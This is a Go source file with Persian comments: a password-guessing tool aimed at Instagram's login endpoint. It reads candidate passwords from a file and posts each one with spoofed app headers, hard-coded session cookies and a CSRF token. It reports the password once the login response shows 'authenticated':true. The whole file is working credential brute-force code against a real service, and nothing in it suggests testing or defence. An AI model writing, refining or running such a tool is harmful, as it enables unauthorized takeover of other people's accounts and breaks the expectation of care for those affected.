package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// --- بخش تنظیمات ---
const (
	// آدرس URL برای ورود (همان نقطه پایانی AJAX که قبلاً استفاده می‌کردید)
	loginURL = "https://www.instagram.com/accounts/login/ajax/"

	// نام فیلدهای فرم
	usernameField    = "username"
	passwordField    = "enc_password" // توجه: پیشوند رمزگذاری هنوز در تابع tryPassword ثابت است
	optIntoOneTap    = "optIntoOneTap"
	queryParams      = "queryParams"
	trustedDeviceRec = "trustedDeviceRecords"
	loginAttemptCount = "loginAttemptCount"
	isPrivacyPortalReq = "isPrivacyPortalReq"


	// نام فایل حاوی رمزهای عبور
	passwordsFile = "password.txt"

	// تاخیر بین تلاش‌ها (به ثانیه)
	retryDelaySeconds = 2
)

// هدرهای HTTP (برخی مقادیر نمونه هستند یا نیاز به تولید پویا دارند)
// نکته مهم: توکن‌های ثابت مانند CSRFToken و کوکی‌ها به احتمال زیاد مشکل‌ساز خواهند بود
// زیرا به جلسه (session) خاصی وابسته‌اند و منقضی می‌شوند. این یک محدودیت بزرگ است.
var defaultHeaders = map[string]string{
	"User-Agent":       "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
	"X-CSRFToken":      "z2y86ITZAahahOfRghvrCF3PlUj4wx8N", // مثال: این باید پویا باشد
	"X-Instagram-AJAX": "1023134472",                     // مثال: این ممکن است تغییر کند
	"X-Requested-With": "XMLHttpRequest",
	"Referer":          "https://www.instagram.com/accounts/login/",
	"Origin":           "https://www.instagram.com",
	"Content-Type":     "application/x-www-form-urlencoded",
	"X-IG-App-ID":      "936619743392459",                    // مثال: این ممکن است تغییر کند
	"X-IG-WWW-Claim":   "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC", // مثال: این باید پویا باشد
	"Cookie":           `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`, // مثال: اینها مربوط به یک جلسه خاص هستند
}

// حالت اشکال‌زدایی (Debug Mode)
// اگر true باشد، لاگ‌های دقیق‌تری نمایش داده می‌شود. برای خروجی کمتر false قرار دهید.
var debugMode = true
// --- پایان بخش تنظیمات ---

func tryPassword(username, password string) bool {
	data := url.Values{}
	// توجه: فرمت رمزگذاری #PWD_INSTAGRAM_BROWSER:10:<timestamp>:<password>
	// خاص است و timestamp در اینجا ثابت است. این یک محدودیت قابل توجه است.
	data.Set(passwordField, "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
	data.Set(usernameField, username)
	data.Set(optIntoOneTap, "false")
	data.Set(queryParams, "{}")
	data.Set(trustedDeviceRec, "{}")
	data.Set(loginAttemptCount, "0")
    data.Set(isPrivacyPortalReq, "false")

	client := &http.Client{
		Timeout: 30 * time.Second, // یک وقفه زمانی (timeout) برای کلاینت اضافه شد
	}
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		if debugMode {
			fmt.Println("خطا در ایجاد درخواست:", err)
		}
		return false
	}

	// تنظیم هدرها از بخش تنظیمات
	for key, value := range defaultHeaders {
		req.Header.Set(key, value)
	}

	if debugMode {
		fmt.Println("\n--- تلاش برای رمز عبور:", password, "---")
		fmt.Println("ارسال درخواست به:", loginURL)
		// fmt.Println("با داده‌های فرم:", data.Encode()) // نمایش داده‌های فرم ممکن است طولانی باشد
		fmt.Println("با هدرها:")
		for key, values := range req.Header {
			fmt.Printf("  %s: %s\n", key, strings.Join(values, ", "))
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		if debugMode {
			fmt.Println("خطا در ارسال درخواست:", err)
		}
		return false
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		if debugMode {
			fmt.Println("خطا در خواندن پاسخ:", err)
		}
		return false
	}
	body := string(bodyBytes)

	if debugMode {
		fmt.Println("وضعیت پاسخ:", resp.StatusCode)
		fmt.Println("بدنه پاسخ:", body)
	}

	// شرط موفقیت اصلی شما
	if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
		return true
	}

	// بررسی اضافی برای چالش امنیتی جهت وضوح بیشتر در حالت debug
	if strings.Contains(body, `"challenge_required"`) || resp.StatusCode == 400 {
		if debugMode {
			fmt.Println("!!! هشدار: چالش امنیتی توسط اینستاگرام شناسایی شد یا درخواست نامعتبر بود (کد: ", resp.StatusCode, ") !!!")
		}
	}
    if resp.StatusCode == 404 {
        if debugMode {
            fmt.Println("!!! هشدار: آدرس URL مقصد (", loginURL, ") پیدا نشد (404) !!!")
        }
    }

	return false
}

func main() {
	fmt.Print("نام کاربری را وارد کنید: ")
	var username string
	fmt.Scanln(&username)

	file, err := os.Open(passwordsFile)
	if err != nil {
		fmt.Println("خطا در باز کردن فایل رمزهای عبور (", passwordsFile, "):", err)
		return
	}
	defer file.Close()

	if debugMode {
		fmt.Println("شروع خواندن رمزها از فایل:", passwordsFile)
	}

	scanner := bufio.NewScanner(file)
	passwordFound := false
	for scanner.Scan() {
		password := scanner.Text()
		if password == "" { // رد کردن خطوط خالی
			continue
		}

		fmt.Println("\nدر حال تلاش برای رمز عبور:", password) // این پیام اصلی باقی می‌ماند

		if tryPassword(username, password) {
			fmt.Println("\n******************************")
			fmt.Println("      رمز عبور پیدا شد:", password)
			fmt.Println("******************************")
			passwordFound = true
			break
		}
		if debugMode {
			fmt.Println("--- پایان تلاش برای رمز عبور:", password, "---")
		}
		time.Sleep(retryDelaySeconds * time.Second)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("خطا در خواندن فایل رمزهای عبور:", err)
	}

	if !passwordFound {
        fmt.Println("\nپردازش فایل رمزهای عبور تمام شد. رمز عبوری پیدا نشد.")
    }
}
